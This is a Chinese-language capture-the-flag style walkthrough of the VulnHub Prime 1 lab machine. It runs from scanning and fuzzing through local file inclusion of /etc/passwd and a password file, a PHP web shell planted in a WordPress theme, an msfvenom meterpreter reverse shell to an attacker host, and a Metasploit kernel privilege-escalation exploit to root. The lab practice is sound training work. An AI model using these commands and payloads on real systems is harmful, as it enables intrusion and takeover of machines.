# vulnhub之prime1的实践

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650745641&idx=1&sn=653772e291b724c73d598d392570cbaf&chksm=87148a29b063033fcd8c3432df08fcb193a00c2ba1c14aabae40b308d05f473350f7513574ba&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650745641&idx=1&sn=653772e291b724c73d598d392570cbaf&chksm=87148a29b063033fcd8c3432df08fcb193a00c2ba1c14aabae40b308d05f473350f7513574ba&scene=27#wechat_redirect)

本周实践的是vulnhub的prime1镜像，下载地址，https://download.vulnhub.com/prime/Prime\_Series\_Level-1.rar，

这是个奇葩的靶机，一路下来全靠提示猜谜语，  

镜像一起来就能看到用户名victor，那就找密码呗，

![](../Images/ae172303752f4263b814c5394e2a9c3f.png)

做个地址扫描，sudo netdiscover -r 192.168.137.0/24，

![](../Images/a9b14ecb98c4e702724d41eacf006ea3.png)

再做个端口扫描，sudo nmap -sS -sV -A -p- 192.168.137.119，

![](../Images/cfea87d7a46ababd89be3cc7735c4cb0.png)

有web服务就目录爆破呗，sudo dirb http://192.168.137.119，

![](../Images/55244f988e591f8822136e09bd8e94ff.png)

有个dev的url，访问一下看看，提示让再努力dig一下，

![](../Images/d97d478cd791b2d8a34485e64a7b0098.png)

那就再努力dig一下吧，sudo dirb http://192.168.137.119 -X .txt,.php,.html,.zip，看到有一个叫secret.txt的文件，

![](../Images/53012ffaed1c2d270dc9cbaad6265545.png)

访问一下，提示让做fuzz，并且提示了一个叫location.txt的文件，

![](../Images/f109eab205e4b6bf954eb01790d5c937.png)

按照提示访问https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz\_For\_Web学做fuzz，

sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.137.119/index.php?FUZZ=something，

![](../Images/597f580e5e5d598f6d6222580f0746d1.png)

sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 --hw 12 http://192.168.137.119/index.php?FUZZ=something，

![](../Images/3192906f18350b1995f9d4b15fc7f9f3.png)

根据结果和之前的location.txt文件提示访问http://192.168.137.119/index.php?file=location.txt，又提示了一个secrettier360参数，

![](../Images/ce85c31fcbee9ccad2e024beffefdcb0.png)

猜测是否有本地文件包含漏洞，还真能读到系统密码文件，

http://192.168.137.119/image.php?secrettier360=/etc/passwd，

又提示了去/home/saket/找password.txt，  

![](../Images/7d6dda574947970479c0c64ff4ce19e0.png)

那就继续吧，http://192.168.137.119/image.php?secrettier360=/home/saket/password.txt，嗯，密码找到了，是follow\_the\_ippsec，

![](../Images/b4fe8c493fd1e71a65b95dd4b473f037.png)

尝试ssh登录失败，想到前面目录爆破的时候还有个url是wordpress，

![](../Images/54c1966275180c5120103a6b5d48cab0.png)

用victor/follow\_the\_ippsec登录还真成功了，

![](../Images/1624cace82b89795044fd6d218ad1432.png)

找到可以被update内容的url，http://192.168.137.119/wordpress/wp-content/themes/twentynineteen/secret.php，

![](../Images/5ed21700be0f01def03826e4eb1aec9a.png)

做一个web shell脚本，sudo msfvenom -p php/meterpreter/reverse\_tcp LHOST=192.168.137.2 LPORT=4444 R，

![](../Images/c708f309db51b7ddcbb8fa180b31b377.png)

把内容贴进去并update成功，

![](../Images/bc543f3477ba8dafeb02115aefee9f3a.png)

用kali开一个监听，  

use exploit/multi/handler  
set payload php/meterpreter/reverse\_tcp  
set lhost 192.168.137.2  
set lport 4444  
exploit

并重新访问这个url，反弹shell就过来了，发现不是root权限，  

![](../Images/4f732f881a58f6a0d36a3ec7eb10a4ca.png)

想办法提权呗，先把会话放到后台，background，

发现系统版本是ubuntu 4.10.0-28-generic，

一搜还真有提权漏洞可用，search 4.10.0-28-generic，开始提权，

use exploit/linux/local/bpf\_sign\_extension\_priv\_esc，set session 1，

![](../Images/796f866d8b450b9945bc30f6652a3b60.png)

拿到一个新的反弹shell，这回是root了，

![](../Images/56c6a065dc4d074d3e248f9d9c17e1b3.png)

至此拿root权限成功。
